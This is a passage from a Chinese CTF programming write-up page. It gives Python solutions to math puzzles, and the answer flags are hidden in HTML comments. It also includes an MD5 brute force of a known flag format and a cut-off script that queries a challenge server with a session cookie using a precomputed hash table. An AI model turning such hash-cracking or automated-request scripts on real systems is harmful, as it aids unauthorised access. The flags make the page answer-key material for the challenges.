<span class="keyword">break</span></span><br><span class="line">    num = num + <span class="number">186</span></span><br></pre></td></tr></table></figure></p><!--CTF{92809}--><h1 id="分数拆分"><a href="#分数拆分" class="headerlink" title="分数拆分"></a>分数拆分</h1><p>存在这样的一个等式，1/400=1/x+1/2y，(x&gt;y)。<br>你的任务就是求出共有多少对这样的正整数x和y，使得该等式成立。<br>（提示：你只需要求出有多少对，而不必输出这些X,Y对具体是多少）<br>hint:CTF{xxx}<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、根据题目等式，可以知道x=400*y)/(y-200)，因为x和y都是正整数，且考虑分母不为0，所以这里可以确定y的最小值为201；</span></span><br><span class="line"><span class="comment"># 2、因为1/400=1/x+1/2</span></span><br><span class="line"><span class="comment"># y，(x &gt; y)，考虑极限情况，可以使得x等于y，因分母变小，即分数整体值增大，即等式变成：1 / 400 &lt; 1 / y + 1 / 2</span></span><br><span class="line"><span class="comment"># y，可以得出y &lt; 600，即得到y的最大值可以为599；</span></span><br><span class="line"><span class="comment"># 3、根据y的变化范围进行编程实现，具体代码如下（这里输出了x：y的值）：</span></span><br><span class="line"></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line">num_list=[]</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">201</span>,<span class="number">600</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">400</span>*y)%(y<span class="number">-200</span>)==<span class="number">0</span>:</span><br><span class="line">        count=count+<span class="number">1</span></span><br><span class="line">        str_add=str((<span class="number">400</span>*y)/(y<span class="number">-200</span>))+<span class="string">':'</span>+str(y)</span><br><span class="line">        num_list.append(str_add)</span><br><span class="line"></span><br><span class="line">print(num_list)</span><br><span class="line">print(<span class="string">'CTF&#123;'</span>+str(count)+<span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure></p><!--CTF{21}--><h1 id="Hashkill"><a href="#Hashkill" class="headerlink" title="Hashkill"></a>Hashkill</h1><p>6ac66ed89ef9654cf25eb88c21f4ecd0是flag的MD5码，（格式为ctf{XXX_XXXXXXXXXXX_XXXXX}）<br>由一个0-1000的数字，下划线，纽约的一个区，下划线，一个10000-15000的数字构成。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">qu = [<span class="string">"thebronx"</span>,<span class="string">"brooklyn"</span>,<span class="string">"manhattan"</span>,<span class="string">"queens"</span>,<span class="string">"statenisland"</span>]</span><br><span class="line">MD5 = <span class="string">"6ac66ed89ef9654cf25eb88c21f4ecd0"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1001</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> qu:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">10000</span>,<span class="number">15001</span>):</span><br><span class="line">                flag = <span class="string">"ctf&#123;"</span> + str(a) + <span class="string">"_"</span> + str(b) + <span class="string">"_"</span> + str(c) + <span class="string">"&#125;"</span></span><br><span class="line">                flaghash = hashlib.md5(flag.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">                <span class="comment"># print(flaghash)</span></span><br><span class="line">                <span class="keyword">if</span> flaghash == MD5:</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    flagmd5 = hash()</span><br><span class="line">    print(flagmd5)</span><br></pre></td></tr></table></figure></p><!--ctf{345_manhattan_10282}--><h1 id="考考你的程序功底"><a href="#考考你的程序功底" class="headerlink" title="考考你的程序功底"></a>考考你的程序功底</h1><p>给定一个20行20列的数表，求其中在一条线上（行、列、两个对角线）连续4个数的乘积的最大值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">8</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="number">97</span>,<span class="number">38</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">40</span>,<span class="number">0</span>,<span class="number">75</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">78</span>,<span class="number">52</span>,<span class="number">12</span>,<span class="number">50</span>,<span class="number">77</span>,<span class="number">91</span>,<span class="number">8</span>]</span><br><span class="line">b = [<span class="number">49</span>,<span class="number">49</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">17</span>,<span class="number">81</span>,<span class="number">18</span>,<span class="number">57</span>,<span class="number">60</span>,<span class="number">87</span>,<span class="number">17</span>,<span class="number">40</span>,<span class="number">98</span>,<span class="number">43</span>,<span class="number">69</span>,<span class="number">48</span>,<span class="number">4</span>,<span class="number">56</span>,<span class="number">62</span>,<span class="number">0</span>]</span><br><span class="line">c = [<span class="number">81</span>,<span class="number">49</span>,<span class="number">31</span>,<span class="number">73</span>,<span class="number">55</span>,<span class="number">79</span>,<span class="number">14</span>,<span class="number">29</span>,<span class="number">93</span>,<span class="number">71</span>,<span class="number">40</span>,<span class="number">67</span>,<span class="number">53</span>,<span class="number">88</span>,<span class="number">30</span>,<span class="number">3</span>,<span class="number">49</span>,<span class="number">13</span>,<span class="number">36</span>,<span class="number">65</span>]</span><br><span class="line">d = [<span class="number">52</span>,<span class="number">70</span>,<span class="number">95</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">60</span>,<span class="number">11</span>,<span class="number">42</span>,<span class="number">69</span>,<span class="number">24</span>,<span class="number">68</span>,<span class="number">56</span>,<span class="number">1</span>,<span class="number">32</span>,<span class="number">56</span>,<span class="number">71</span>,<span class="number">37</span>,<span class="number">2</span>,<span class="number">36</span>,<span class="number">91</span>]</span><br><span class="line">e = [<span class="number">22</span>,<span class="number">31</span>,<span class="number">16</span>,<span class="number">71</span>,<span class="number">51</span>,<span class="number">67</span>,<span class="number">63</span>,<span class="number">89</span>,<span class="number">41</span>,<span class="number">92</span>,<span class="number">36</span>,<span class="number">54</span>,<span class="number">22</span>,<span class="number">40</span>,<span class="number">40</span>,<span class="number">28</span>,<span class="number">66</span>,<span class="number">33</span>,<span class="number">13</span>,<span class="number">80</span>]</span><br><span class="line">f = [<span class="number">24</span>,<span class="number">47</span>,<span class="number">32</span>,<span class="number">60</span>,<span class="number">99</span>,<span class="number">3</span>,<span class="number">45</span>,<span class="number">2</span>,<span class="number">44</span>,<span class="number">75</span>,<span class="number">33</span>,<span class="number">53</span>,<span class="number">78</span>,<span class="number">36</span>,<span class="number">84</span>,<span class="number">20</span>,<span class="number">35</span>,<span class="number">17</span>,<span class="number">12</span>,<span class="number">50</span>]</span><br><span class="line">g = [<span class="number">32</span>,<span class="number">98</span>,<span class="number">81</span>,<span class="number">28</span>,<span class="number">64</span>,<span class="number">23</span>,<span class="number">67</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">38</span>,<span class="number">40</span>,<span class="number">67</span>,<span class="number">59</span>,<span class="number">54</span>,<span class="number">70</span>,<span class="number">66</span>,<span class="number">18</span>,<span class="number">38</span>,<span class="number">64</span>,<span class="number">70</span>]</span><br><span class="line">h = [<span class="number">67</span>,<span class="number">26</span>,<span class="number">20</span>,<span class="number">68</span>,<span class="number">2</span>,<span class="number">62</span>,<span class="number">12</span>,<span class="number">20</span>,<span class="number">95</span>,<span class="number">63</span>,<span class="number">94</span>,<span class="number">39</span>,<span class="number">63</span>,<span class="number">8</span>,<span class="number">40</span>,<span class="number">91</span>,<span class="number">66</span>,<span class="number">49</span>,<span class="number">94</span>,<span class="number">21</span>]</span><br><span class="line">i = [<span class="number">24</span>,<span class="number">55</span>,<span class="number">58</span>,<span class="number">5</span>,<span class="number">66</span>,<span class="number">73</span>,<span class="number">99</span>,<span class="number">26</span>,<span class="number">97</span>,<span class="number">17</span>,<span class="number">78</span>,<span class="number">78</span>,<span class="number">96</span>,<span class="number">83</span>,<span class="number">14</span>,<span class="number">88</span>,<span class="number">34</span>,<span class="number">89</span>,<span class="number">63</span>,<span class="number">72</span>]</span><br><span class="line">j = [<span class="number">21</span>,<span class="number">36</span>,<span class="number">23</span>,<span class="number">9</span>,<span class="number">75</span>,<span class="number">0</span>,<span class="number">76</span>,<span class="number">44</span>,<span class="number">20</span>,<span class="number">45</span>,<span class="number">35</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">61</span>,<span class="number">33</span>,<span class="number">97</span>,<span class="number">34</span>,<span class="number">31</span>,<span class="number">33</span>,<span class="number">95</span>]</span><br><span class="line">k = [<span class="number">78</span>,<span class="number">17</span>,<span class="number">53</span>,<span class="number">28</span>,<span class="number">22</span>,<span class="number">75</span>,<span class="number">31</span>,<span class="number">67</span>,<span class="number">15</span>,<span class="number">94</span>,<span class="number">3</span>,<span class="number">80</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">16</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">53</span>,<span class="number">56</span>,<span class="number">92</span>]</span><br><span class="line">l = [<span class="number">16</span>,<span class="number">39</span>,<span class="number">5</span>,<span class="number">42</span>,<span class="number">96</span>,<span class="number">35</span>,<span class="number">31</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">58</span>,<span class="number">88</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">17</span>,<span class="number">54</span>,<span class="number">24</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">85</span>,<span class="number">57</span>]</span><br><span class="line">m = [<span class="number">86</span>,<span class="number">56</span>,<span class="number">0</span>,<span class="number">48</span>,<span class="number">35</span>,<span class="number">71</span>,<span class="number">89</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">44</span>,<span class="number">44</span>,<span class="number">37</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">21</span>,<span class="number">58</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">17</span>,<span class="number">58</span>]</span><br><span class="line">n = [<span class="number">19</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">68</span>,<span class="number">5</span>,<span class="number">94</span>,<span class="number">47</span>,<span class="number">69</span>,<span class="number">28</span>,<span class="number">73</span>,<span class="number">92</span>,<span class="number">13</span>,<span class="number">86</span>,<span class="number">52</span>,<span class="number">17</span>,<span class="number">77</span>,<span class="number">4</span>,<span class="number">89</span>,<span class="number">55</span>,<span class="number">40</span>]</span><br><span class="line">o = [<span class="number">4</span>,<span class="number">52</span>,<span class="number">8</span>,<span class="number">83</span>,<span class="number">97</span>,<span class="number">35</span>,<span class="number">99</span>,<span class="number">16</span>,<span class="number">7</span>,<span class="number">97</span>,<span class="number">57</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">79</span>,<span class="number">33</span>,<span class="number">27</span>,<span class="number">98</span>,<span class="number">66</span>]</span><br><span class="line">p = [<span class="number">88</span>,<span class="number">36</span>,<span class="number">68</span>,<span class="number">87</span>,<span class="number">57</span>,<span class="number">62</span>,<span class="number">20</span>,<span class="number">72</span>,<span class="number">3</span>,<span class="number">46</span>,<span class="number">33</span>,<span class="number">67</span>,<span class="number">46</span>,<span class="number">55</span>,<span class="number">12</span>,<span class="number">32</span>,<span class="number">63</span>,<span class="number">93</span>,<span class="number">53</span>,<span class="number">69</span>]</span><br><span class="line">q = [<span class="number">4</span>,<span class="number">42</span>,<span class="number">16</span>,<span class="number">73</span>,<span class="number">38</span>,<span class="number">25</span>,<span class="number">39</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">94</span>,<span class="number">72</span>,<span class="number">18</span>,<span class="number">8</span>,<span class="number">46</span>,<span class="number">29</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">62</span>,<span class="number">76</span>,<span class="number">36</span>]</span><br><span class="line">r = [<span class="number">20</span>,<span class="number">69</span>,<span class="number">36</span>,<span class="number">41</span>,<span class="number">72</span>,<span class="number">30</span>,<span class="number">23</span>,<span class="number">88</span>,<span class="number">34</span>,<span class="number">62</span>,<span class="number">99</span>,<span class="number">69</span>,<span class="number">82</span>,<span class="number">67</span>,<span class="number">59</span>,<span class="number">85</span>,<span class="number">74</span>,<span class="number">4</span>,<span class="number">36</span>,<span class="number">16</span>]</span><br><span class="line">s = [<span class="number">20</span>,<span class="number">73</span>,<span class="number">35</span>,<span class="number">29</span>,<span class="number">78</span>,<span class="number">31</span>,<span class="number">90</span>,<span class="number">1</span>,<span class="number">74</span>,<span class="number">31</span>,<span class="number">49</span>,<span class="number">71</span>,<span class="number">48</span>,<span class="number">86</span>,<span class="number">81</span>,<span class="number">16</span>,<span class="number">23</span>,<span class="number">57</span>,<span class="number">5</span>,<span class="number">54</span>]</span><br><span class="line">t = [<span class="number">1</span>,<span class="number">70</span>,<span class="number">54</span>,<span class="number">71</span>,<span class="number">83</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">69</span>,<span class="number">16</span>,<span class="number">92</span>,<span class="number">33</span>,<span class="number">48</span>,<span class="number">61</span>,<span class="number">43</span>,<span class="number">52</span>,<span class="number">1</span>,<span class="number">89</span>,<span class="number">19</span>,<span class="number">67</span>,<span class="number">48</span>]</span><br><span class="line">lists = []</span><br><span class="line">lie = [a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t]</span><br><span class="line"><span class="comment"># 行</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> lie:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">        product = j[i] * j[i+<span class="number">1</span>] * j[i+<span class="number">2</span>] * j[i+<span class="number">3</span>]</span><br><span class="line">        print(product)</span><br><span class="line">        lists.append(product)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">        product = (lie[i])[j] * (lie[i+<span class="number">1</span>])[j] * (lie[i+<span class="number">2</span>])[j] * (lie[i+<span class="number">3</span>])[j]</span><br><span class="line">        print(product)</span><br><span class="line">        lists.append(product)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对角线1</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">        product = (lie[i])[j] * (lie[i+<span class="number">1</span>])[j+<span class="number">1</span>] * (lie[i+<span class="number">2</span>])[j+<span class="number">2</span>] * (lie[i+<span class="number">3</span>])[j+<span class="number">3</span>]</span><br><span class="line">        print(product)</span><br><span class="line">        lists.append(product)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对角线2</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">        product = (lie[<span class="number">16</span>-i])[j+<span class="number">3</span>] * (lie[<span class="number">16</span>-i+<span class="number">1</span>])[j+<span class="number">2</span>] * (lie[<span class="number">16</span>-i+<span class="number">2</span>])[j+<span class="number">1</span>] * (lie[<span class="number">16</span>-i+<span class="number">3</span>])[j]</span><br><span class="line">        print(product)</span><br><span class="line">        lists.append(product)</span><br><span class="line"></span><br><span class="line">print(lists)</span><br><span class="line">print(max(lists))</span><br></pre></td></tr></table></figure></p><!--70600674--><p style="display:none;">KEY:IL0V3Pr0Gr4m@#!!</p><h1 id="括号表达式"><a href="#括号表达式" class="headerlink" title="括号表达式"></a>括号表达式</h1><p>一个括号表达式可以按照如下的规则表示，就是每个右括号之前的左括号数。<br>比如(((()()())))，每个右括号之前的左括号数序列为P=4 5 6 6 6 6，而每个右括号所在的括号内包含的括号数为W=1 1 1 4 5 6。<br>现在给定一个括号表达式为 4 6 6 6 6 8 9 9 9，输出每个右括号所在的括号内包含的括号数。<br>key格式：CTF{xxx}<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这道题要写，数都数得来，画画图或者模拟整个过程一定会出来结果，我们不妨看看能否找出规律。</span></span><br><span class="line"><span class="comment"># 举个例子，P=4 5 6 6 6 6，而每个右括号所在的括号内包含的括号数为W=1 1 1 4 5 6。</span></span><br><span class="line"><span class="comment"># P中的每一个数可以代表的是一个右括号，则数字4，不用说，必然与前面一左括号匹配，</span></span><br><span class="line"><span class="comment"># 即为，数字4与5之间两个右括号有（5-4）个左括号，而数字4与5之间没有其他数字也即没有其他右括号</span></span><br><span class="line"><span class="comment"># ，则这个左括号必然是与数字5所代表的右括号匹配，则也为1，同理数字5与6也是这样，到了第二个数字6，</span></span><br><span class="line"><span class="comment"># 其往前找到第一个数字6，中间没有左括号，则继续往前找到5，数字5与数字6中间有（6-5）个左括号，</span></span><br><span class="line"><span class="comment"># 而两个数之间还有一个右括号，则不行，得继续往前，找到4，同理不行，前面没有数了，那么就看这个数字6（第二个的）在p中是第几个就好了，</span></span><br><span class="line"><span class="comment"># 应该说是与找到合理的数字下表之差，往后依旧。则对于4 6 6 6 6 8 9 9 9 即为 1 1 2 4 5 1 1 3 9 转化为代码即为</span></span><br><span class="line">left = [<span class="number">0</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">9</span>]</span><br><span class="line">lists = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(left)):</span><br><span class="line">    j = i - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(left[i]-left[j]&lt;i-j):</span><br><span class="line">        j = j<span class="number">-1</span></span><br><span class="line">    print(i-j)</span><br><span class="line">    lists.append(i-j)</span><br><span class="line">print(<span class="string">"%d%d%d%d%d%d%d%d%d"</span>%(lists[<span class="number">0</span>],lists[<span class="number">1</span>],lists[<span class="number">2</span>],lists[<span class="number">3</span>],lists[<span class="number">4</span>],lists[<span class="number">5</span>],lists[<span class="number">6</span>],lists[<span class="number">7</span>],lists[<span class="number">8</span>]))</span><br></pre></td></tr></table></figure></p><!--112451139--><h1 id="斐波那契数列"><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h1><p>数列A满足An = An-1 + An-2 + An-3, n &gt;= 3<br>编写程序，输入A0, A1 和 A2的值1 1 1时, 计算A99的高八位。<br>key格式：CTF{}<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">A</span><span class="params">(num)</span>:</span></span><br><span class="line">    a,b,c = <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> num &lt; <span class="number">3</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num<span class="number">-2</span>):</span><br><span class="line">        a,b,c = b,c,c+a+b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    a = A(<span class="number">99</span>)</span><br><span class="line">    print(a)</span><br><span class="line">    print(<span class="string">"CTF&#123;"</span>+ str(a)[:<span class="number">8</span>] + <span class="string">"&#125;"</span>)</span><br></pre></td></tr></table></figure></p><!--CTF{69087442}--><h1 id="大数据问题"><a href="#大数据问题" class="headerlink" title="大数据问题"></a>大数据问题</h1><p>小明刚刚学习计算机编程，老师给他出了这样一道题目，<br>但是他怎样思考，都做不出来，于是，只好请教高手的你了。<br>求sum = 1!+2!+3!+……+6788!+6789!的末5位。<br>提交格式：SimCTF{}<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">a = <span class="number">25</span></span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,a):</span><br><span class="line">    j = math.factorial(i)</span><br><span class="line">    sum += j</span><br><span class="line"></span><br><span class="line">print(str(sum)[<span class="number">-5</span>:])</span><br></pre></td></tr></table></figure></p><!--SimCTF{40313}--><h1 id="三羊献瑞"><a href="#三羊献瑞" class="headerlink" title="三羊献瑞"></a>三羊献瑞</h1><p>观察下面的加法算式：<br>&nbsp;&nbsp;&nbsp;祥 瑞 生 辉<br>&nbsp;+ 三 羊 献 瑞<br>-——————<br>&nbsp;三 羊 生 瑞 气</p><p>其中，相同的汉字代表相同的数字，不同的汉字代表不同的数字。<br>请计算“三羊献瑞”四个字分别代表的数字<br>答案格式：CTF{xxxx}，xxxx为“三羊献瑞”四个字分别代表的数字<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设：祥=a,瑞=b,生=c,辉=d,三=e,羊=f,献=g,气=h</span></span><br><span class="line"><span class="comment"># 可以推出a=9,e=1,f=0</span></span><br><span class="line">a = <span class="number">9</span></span><br><span class="line">e = <span class="number">1</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yang</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">                <span class="keyword">for</span> g <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">                    <span class="keyword">for</span> h <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">                        print(a, b, c, d, e, f, g, h)</span><br><span class="line">                        <span class="keyword">if</span>(a*<span class="number">1000</span>+b*<span class="number">100</span>+c*<span class="number">10</span>+d+e*<span class="number">1000</span>+f*<span class="number">100</span>+g*<span class="number">10</span>+b)==(e*<span class="number">10000</span>+f*<span class="number">1000</span>+c*<span class="number">100</span>+b*<span class="number">10</span>+h):</span><br><span class="line">                            <span class="keyword">if</span>(a!=b)<span class="keyword">and</span>(a!=c)<span class="keyword">and</span>(a!=d)<span class="keyword">and</span>(a!=e)<span class="keyword">and</span>(a!=f)<span class="keyword">and</span>(a!=g)<span class="keyword">and</span>(a!=h):</span><br><span class="line">                                <span class="keyword">if</span>(b!=c)<span class="keyword">and</span>(b!=d)<span class="keyword">and</span>(b!=e)<span class="keyword">and</span>(b!=f)<span class="keyword">and</span>(b!=g)<span class="keyword">and</span>(b!=h):</span><br><span class="line">                                    <span class="keyword">if</span>(c!=d)<span class="keyword">and</span>(c!=e)<span class="keyword">and</span>(c!=f)<span class="keyword">and</span>(c!=g)<span class="keyword">and</span>(c!=h):</span><br><span class="line">                                        <span class="keyword">if</span>(d!=e)<span class="keyword">and</span>(d!=f)<span class="keyword">and</span>(d!=g)<span class="keyword">and</span>(d!=h):</span><br><span class="line">                                            <span class="keyword">if</span>(e!=f)<span class="keyword">and</span>(e!=g)<span class="keyword">and</span>(e!=h):</span><br><span class="line">                                                <span class="keyword">if</span>(f!=g)<span class="keyword">and</span>(f!=h):</span><br><span class="line">                                                    <span class="keyword">if</span>(g!=h):</span><br><span class="line">                                                        print(<span class="string">"三=%s，羊=%s，献=%s，瑞=%s"</span>%(e,f,g,b))</span><br><span class="line">                                                        print(a,b,c,d,e,f,g,h)</span><br><span class="line">                                                        <span class="keyword">return</span> str(e)+str(f)+str(g)+str(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    flag = yang()</span><br><span class="line">    print(<span class="string">"CTF&#123;"</span> + flag + <span class="string">"&#125;"</span>)</span><br></pre></td></tr></table></figure></p><!--CTF{1085}--><h1 id="速度爆破"><a href="#速度爆破" class="headerlink" title="速度爆破"></a>速度爆破</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5,sha1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100001</span>):</span><br><span class="line">    Sha1 = sha1((md5(str(i).encode(<span class="string">'utf-8'</span>)).hexdigest()).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    list[Sha1] = i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">'http://ctf5.shiyanbar.com/ppc/sd.php'</span></span><br><span class="line">    req = request.Request(url)</span><br><span class="line">    req.add_header(<span class="string">"Cookie"</span>,<span class="string">"PHPSESSID=ga0un6plm7tea9li11bgnommh1"</span>)</span><br><span class="line">    <span class="comment"># print(req)</span></span><br><span class="line">    response = request.urlopen(req)</span><br><span class="line">    html = response.read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    a = html.find(<span class="string">'color:red'</span>)</span><br><span class="line">    str = html[a+<span class="number">11</span>:a+<span class="number">40</span>+<span class="number">11</span>]</span><br><span class="line">    <span class="comment"># 